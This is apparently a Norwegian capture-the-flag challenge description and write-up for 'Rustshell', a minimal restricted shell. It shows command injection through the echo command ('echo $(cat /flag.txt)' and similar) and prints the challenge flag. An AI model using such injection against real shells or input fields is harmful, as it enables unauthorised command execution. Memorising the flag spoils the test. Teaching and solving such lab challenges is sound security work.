# Rustshell

Bash, zsh, fish, og alle de andre kjente skallene er så 2020. I år er det på tide å prøve noe nytt!

Rustshell er et minimalistisk shell skrevet i Rust, og det har akkurat det du trenger for å løse denne oppgaven. Det er ikke så mye mer enn det.

*Tilkobling:*

`openssl s_client -connect skatt-rustshell.chals.io:443 -servername skatt-rustshell.chals.io -quiet`

eller med [snicat](https://github.com/CTFd/snicat):

`sc skatt-rustshell.chals.io`

[⬇️ rustshell](./rustshell)

# Writeup

Kobler man til og skriver help får man følgende kommandoer:

```bash
Available commands:
  ls    [path]   - list directory contents
  cd    [path]   - change directory
  echo  [text]   - display text
  cat   [file]   - display file contents
  pwd            - print working directory
  uname [-a/-r]  - system information
  whoami         - current user
  clear          - clear screen
  help           - this help message
  exit           - exit shell
```

Dette virker jo sikkert nok, de fleste kommandoer er sikret men `echo`-kommandoen er sårbar for command injection. Man kan for eksempel skrive `echo $(id)` for å få ut informasjon om brukeren. 

```bash
guest@rustshell:/$ echo $(ls /)
bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

Her ser man flag.txt i root

```bash
guest@rustshell:/$ echo $(cat /flag.txt)
skatt{j41lbr3ak_1mm1n3nt}
```

Se kildekoden her [source.rs](./source.rs).

# Flag

```
skatt{j41lbr3ak_1mm1n3nt}
```